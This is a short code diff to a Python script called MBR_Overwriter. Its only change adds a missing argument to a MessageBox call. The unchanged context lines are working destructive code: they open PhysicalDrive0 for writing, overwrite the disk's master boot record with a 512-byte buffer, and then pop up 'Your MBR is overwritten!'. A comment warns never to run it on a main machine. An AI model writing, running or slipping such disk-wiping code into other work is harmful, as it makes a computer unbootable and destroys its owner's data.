@@ -17,7 +17,7 @@ class MBR_Overwriter:
             hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create a handle to our Physical Drive
             WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite the MBR! (Never run this on your main machine!)
             CloseHandle(hDevice) # Close the handle to our Physical Drive!
-            MessageBox("Your MBR is overwritten!", "Oh No!", MB_ICONWARNING | MB_OK)
+            MessageBox(0, "Your MBR is overwritten!", "Oh No!", MB_ICONWARNING | MB_OK)
 
 if __name__ == "__main__":
     MBR_Overwriter.Overwrite()
